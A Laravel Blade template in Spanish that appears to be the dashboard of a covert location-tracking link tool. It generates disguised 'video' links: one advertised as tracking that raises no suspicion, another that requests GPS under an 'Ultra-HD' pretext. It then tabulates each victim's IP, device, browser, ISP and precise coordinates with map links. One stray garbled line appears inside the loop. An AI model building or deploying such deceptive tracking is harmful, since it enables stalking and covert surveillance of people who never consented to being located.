@extends('layouts.app')

@section('content')


<div class="px-4 py-5 my-5 text-center">
  <img class="d-block mx-auto mb-4" src="{{ asset('icons/icons8-globe-showing-americas-48.png') }}" alt="" width="72" height="57">
  <h1 class="display-5 fw-bold">{{ strtoupper($enlace->titulo) }}</h1>
  <div class="col-lg-6 mx-auto">
    <p class="lead mb-4">{{  strtoupper($enlace->descripcion) }}</p>
    <div class="d-grid gap-2 d-sm-flex justify-content-sm-center">

      <div class="row align-items-md-stretch">
        <div class="col-md-6">
          <div class="h-100 p-5 text-white bg-dark rounded-3">
            <h2>Rastreo Rapido (no levanta sospechas)</h2>
            <code>
              {{ route('vista',['video' => base64_encode($enlace->id) ]) }}
            </code>
          </div>
        </div>
        <div class="col-md-6">
          <div class="h-100 p-5 bg-dark border rounded-3">
            <h2>Rastreo GPS (pide activar GPS)</h2>
            <code>
              {{ route('vista',['video' => base64_encode($enlace->id),'comenzar' => "Ultra-HD" ]) }}
            </code>
          </div>
        </div>
      </div>

      
    </div>
  </div>
</div>



    <main class="container">
       

        <div class="my-3 p-3 bg-body rounded shadow-sm">
            <h6 class="border-bottom pb-2 mb-0 text-primary">  Enlaces : {{ count($contenido ) }}</h6>
            <p class="text-dark">* Cada vez que habrán cualquier enlace se hará un rastreo rápido. (La seguridad va a depender de cada enlace).</p>
            <div class="table-responsive">
                <table class="table table-striped table-sm">
                  <thead>
                    <tr>
                      <th scope="col">Tipo de rastreo</th>
                      <th scope="col">Dispositivo</th>
                      <th scope="col">Rastreo Con Permisos</th>
                      <th scope="col">Ip localizador con Permisos</th>
                    </tr>
                  </thead>
                  <tbody>

                    {{-- <tr>
                      <td>38.43.129.48 United States</td>
                      <td>
                        SO <br>
                        Dispositivo <br>
                        Operador <br>
                        Marca <br>
                        Modelo
                      </td>
                      <td>CON IP sin permiso o Con GPS con permiso   (Fecha hora)</td>
                      <td><a href="">button</a></td>
                      <td><a href="">button</a></td>
                    
                    </tr> --}}

            @foreach ($contenido as $item)

          ipjs, , , , , , , , , , , , , , x

                    <tr>
                      <td>{{$item->modalidad_ingreso}}</td>
                      <td>
                          @if($item->ip != "0.0.0.0")
                            IP: {{$item->ip}}<br>
                            <a href="https://www.geolocation.com/?ip={{$item->ip}}" target="_blank">Ubicar IP por geolocation  </a><br>
                          @endif
                          Dispositivo: {{$item->dispositivo}}<br>
                          Navegador: {{$item->navegador}}<br>
                          Version: {{$item->version}}<br>
                          {{-- Servidor: {{$item->lugar}}<br> --}}
                          Fecha: {{$item->created_at}}<br>
                           {{-- <a href="https://api.ipbase.com/v1/json/{{$item->ip}}" target="_blank">Obtener IP coordenadas</a>
                           <a href="https://www.geolocation.com/" target="_blank">Buscar IP coordenadas</a> --}}
                           
                      </td>
                      <td>
                        @if($item->latitud || $item->longitud)
                          Latitud: {{$item->latitud}}<br>
                          Longitud: {{$item->longitud}}<br>
                          Fecha: {{$item->created_permission}}<br>
                          
                          <a href="https://maps.google.com/?q={{$item->latitud}},{{$item->longitud}}" target="_blank">Ver en google maps</a>
                        @endif
                      </td>
                      <td>
                        @if($item->ipjs || $item->latitude)
                          ipjs: {{$item->ipjs}}<br>
                          <a href="https://www.geolocation.com/?ip={{$item->ipjs}}" target="_blank">Ubicar IP por geolocation  </a><br>
                          city: {{$item->city}}<br>
                          continent: {{$item->continent}}<br>
                          país: {{$item->country}}<br>
                          capital_del_país: {{$item->country_capital}}<br>
                          código_del_país: {{$item->country_code}}<br>
                          teléfono_del_país: {{$item->country_phone}}<br>
                          moneda: {{$item->currency}}<br>
                          isp: {{$item->isp}} <span style="font-size: 5px;">Proveedor de servicios de internet</span><br>
                          moneda cambio: {{$item->currency_rates}}<br>
                          latitude: {{$item->latitude}}<br>
                          longitude: {{$item->longitude}}<br>
                          <a href="https://maps.google.com/?q={{$item->latitude}},{{$item->longitude}}" target="_blank">Ver region por google maps</a><br>
                          region: {{$item->region}}<br>
                          timezone: {{$item->timezone}}<br>
                          Fecha: {{$item->created_ip_location}}<br>
                          @endif
                      </td>
                   
                    </tr>
            @endforeach
        </tbody>
    </table>
  </div>



        </div>

       
    </main>
@endsection
